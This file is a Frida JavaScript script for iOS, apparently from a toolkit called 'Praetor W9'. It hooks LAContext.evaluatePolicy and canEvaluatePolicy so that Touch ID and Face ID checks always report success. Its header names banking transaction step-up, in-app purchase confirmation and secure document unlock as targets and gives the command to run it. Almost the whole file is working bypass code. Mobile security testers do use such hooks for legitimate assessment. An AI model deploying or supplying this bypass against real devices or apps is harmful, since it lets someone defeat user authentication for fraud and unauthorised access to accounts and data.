/*
 * iOS LocalAuthentication framework bypass (Praetor W9).
 *
 * Hooks LAContext.evaluatePolicy:localizedReason:reply: and forces success
 * regardless of biometric / passcode result. Defeats Touch ID / Face ID
 * gates on:
 *   - "Stay logged in" prompts
 *   - In-app purchase confirmation
 *   - Secure document unlock
 *   - Banking transaction step-up
 *
 * Does NOT defeat Keychain access-control-list protection — keychain items
 * with kSecAccessControlBiometryCurrentSet still require a real authenticated
 * SecAccessControl context.
 *
 * Run: frida -U -l ios_lacontext_bypass.js -f <bundle_id>
 */
if (ObjC.available) {
  var LAContext = ObjC.classes.LAContext;

  // The async/reply variant — most common.
  LAContext['- evaluatePolicy:localizedReason:reply:'].implementation =
    ObjC.implement(
      LAContext['- evaluatePolicy:localizedReason:reply:'],
      function (self, sel, policy, reason, reply) {
        console.log('[LAContext.evaluatePolicy] policy=' + policy
          + ' reason=' + (reason ? reason.toString() : 'nil')
          + ' -> bypassed');
        // Call reply(YES, nil) to fake success.
        var block = new ObjC.Block(reply);
        block.implementation(true, null);
      }
    );

  // canEvaluatePolicy: always returns YES so apps that gate UI on capability
  // detection don't hide the biometric flow.
  LAContext['- canEvaluatePolicy:error:'].implementation =
    ObjC.implement(
      LAContext['- canEvaluatePolicy:error:'],
      function (self, sel, policy, error) {
        console.log('[LAContext.canEvaluatePolicy] -> YES forced');
        return true;
      }
    );

  console.log('[+] LAContext biometric bypass loaded');
}
